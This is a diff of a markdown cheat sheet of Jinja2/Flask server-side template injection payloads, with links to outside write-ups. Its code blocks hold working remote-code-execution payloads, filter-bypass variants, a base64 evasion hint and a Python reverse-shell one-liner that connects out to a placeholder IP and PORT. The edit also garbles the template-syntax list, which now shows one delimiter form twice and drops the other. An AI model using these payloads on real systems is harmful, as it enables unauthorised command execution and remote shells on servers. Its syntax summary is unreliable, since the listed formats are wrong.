@@ -1,20 +1,18 @@
-# jinja2 flask SSTI
+# jinja2 flask template injection
 
 ## Info
 
 * **Method Resolution Order (mro):** allows to go up the inherited objects chain
 * **subclasses:** going down the inheritance chain
 
-## Jinja2 Templates
+## Jinja2 template formts:
 
-Jinja2 supports templates for the format
+* `` `{% ... %}` ``
+* `` `{% ... %}` ``
 
-```bash
-{{ ... }}
-{% ... %}
-```
+## RCE Methods
 
-## subprocess.pOpen method
+### subprocess.pOpen method
 
 ```bash
 # print all config vars
@@ -33,7 +31,7 @@ Jinja2 supports templates for the format
 {{ ''.__class__.__mro__[X].__subclasses__()[XXX]('id', shell=True, stdout=-1).communicate() }}
 ```
 
-## RCE Styles
+### More styles
 
 ```bash
 {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
@@ -49,7 +47,7 @@ Jinja2 supports templates for the format
 {% for x in ().class.base.subclasses() %}{% if "warning" in x.name %}{{x()._module.builtins['import']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash", "-i"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-## Bypass restrictions (1)
+### Bypass restrictions (1)
 
 * [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)
 
@@ -69,7 +67,7 @@ Jinja2 supports templates for the format
 {%endfor%}
 ```
 
-## Bypassing restrictions (2)
+### Bypassing restrictions (2)
 
 ```bash
 {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
@@ -87,7 +85,7 @@ Jinja2 supports templates for the format
 # can try using bas64 payload
 ```
 
-## References
+### References
 
 * [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
 * [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)
